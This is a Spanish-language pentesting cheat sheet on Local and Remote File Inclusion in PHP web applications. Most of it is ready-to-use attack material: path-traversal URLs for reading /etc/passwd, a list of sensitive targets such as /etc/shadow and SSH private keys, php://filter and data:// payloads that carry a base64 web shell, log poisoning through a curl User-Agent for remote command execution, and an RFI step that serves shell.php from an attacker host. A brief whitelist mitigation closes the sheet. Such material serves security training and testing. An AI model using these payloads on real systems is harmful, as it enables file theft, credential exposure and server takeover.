# Local File Inclusion (LFI) y Remote File Inclusion (RFI)

LFI permite leer archivos del servidor. RFI permite incluir archivos remotos (RCE).

OWASP: A01:2021 Broken Access Control | CWE-22 Path Traversal

## Deteccion de LFI

```bash
# URLs tipicas vulnerables
http://web.com/page?file=about.html
http://web.com/index.php?page=contact
http://web.com/?lang=es&template=main

# Payload basico: path traversal
http://web.com/page?file=../../../etc/passwd
http://web.com/page?file=....//....//....//etc/passwd
http://web.com/page?file=..%2F..%2F..%2Fetc%2Fpasswd
http://web.com/page?file=....\/....\/etc/passwd

# Si se ve el contenido de /etc/passwd -> VULNERABLE
# root:x:0:0:root:/root:/bin/bash
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

## Archivos interesantes para leer

```bash
# Linux
/etc/passwd             -> usuarios del sistema
/etc/shadow             -> hashes de contrasenas (si hay permisos)
/etc/hosts              -> hosts locales
/proc/self/environ      -> variables de entorno (puede tener credenciales)
/var/log/apache2/access.log  -> logs de Apache
/var/log/nginx/access.log    -> logs de Nginx
/home/usuario/.ssh/id_rsa    -> clave privada SSH

# Windows
C:/Windows/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/inetpub/wwwroot/web.config
C:/xampp/apache/logs/access.log
```

## PHP Wrappers (leer codigo fuente)

```bash
# Leer el codigo PHP en base64 (evita ejecucion)
http://web.com/page?file=php://filter/convert.base64-encode/resource=index.php
# Decodificar el resultado: echo "BASE64" | base64 -d

# Datos directos (RCE si PHP permite data://)
http://web.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
# El base64 es: <?php system($_GET['cmd']);?>
# Luego: ?file=data://...&cmd=id
```

## Log Poisoning -> RCE

```bash
# 1. Incluir el log de Apache
http://web.com/page?file=../../../var/log/apache2/access.log

# 2. Inyectar codigo PHP en el User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://web.com/

# 3. El log queda contaminado con el codigo PHP

# 4. Incluir el log + ejecutar comando
http://web.com/page?file=../../../var/log/apache2/access.log&cmd=id
http://web.com/page?file=../../../var/log/apache2/access.log&cmd=whoami
```

## RFI (Remote File Inclusion)

```bash
# Crear shell PHP en Kali
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000

# Incluir el archivo remoto (si allow_url_include = On en PHP)
http://web.com/page?file=http://KALI:8000/shell.php&cmd=id
http://web.com/page?file=http://KALI:8000/shell.php&cmd=cat+/etc/passwd
```

## Mitigacion

```php
// MAL
include($_GET['file'] . '.php');

// BIEN -- whitelist de archivos permitidos
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . '.php');
}
```
